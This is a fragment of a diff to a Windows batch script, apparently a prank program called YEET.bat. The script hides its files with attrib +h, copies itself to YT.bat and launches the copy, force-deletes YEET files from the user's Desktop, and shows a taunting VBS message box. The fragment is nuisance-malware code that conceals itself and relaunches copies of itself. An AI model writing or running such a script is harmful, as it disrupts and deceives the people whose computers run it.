@@ -37,8 +37,8 @@ attrib +h yt.vbs
 wscript yt.vbs
 attrib -h yt.vbs
 copy YEET.bat YT.bat
-start YT.bat
 attrib +h YT.bat
+start .\YT.bat
 del %userprofile%\Desktop\YEET.* /f
 echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
 attrib +h yt.vbs
